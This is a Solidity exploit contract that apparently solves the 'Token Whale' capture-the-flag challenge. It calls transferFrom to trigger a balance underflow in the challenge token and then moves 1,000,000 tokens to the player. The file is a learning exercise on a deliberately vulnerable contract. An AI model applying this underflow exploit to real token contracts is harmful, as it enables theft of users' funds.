// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;
import "hardhat/console.sol";

import {TokenWhaleChallenge} from "./TokenWhaleChallenge.sol";

contract TokenWhaleExploit {
    TokenWhaleChallenge public tokenWhale;
    address public player;

    constructor(TokenWhaleChallenge _tokenWhale, address _player) {
        tokenWhale = _tokenWhale;
        player = _player;
    }

    function attack() external {
        
        tokenWhale.transferFrom(player, player, 10);

        // Now this exploit contract balance is huge. Transfer 1,000,000 of these tokens to the player to complete the challenge.
        uint256 exploitBalance = tokenWhale.balanceOf(address(this));
        console.log("Exploit contract balance:", exploitBalance); 

        tokenWhale.transfer(player, 1000000);
    }

    receive() external payable {}
}
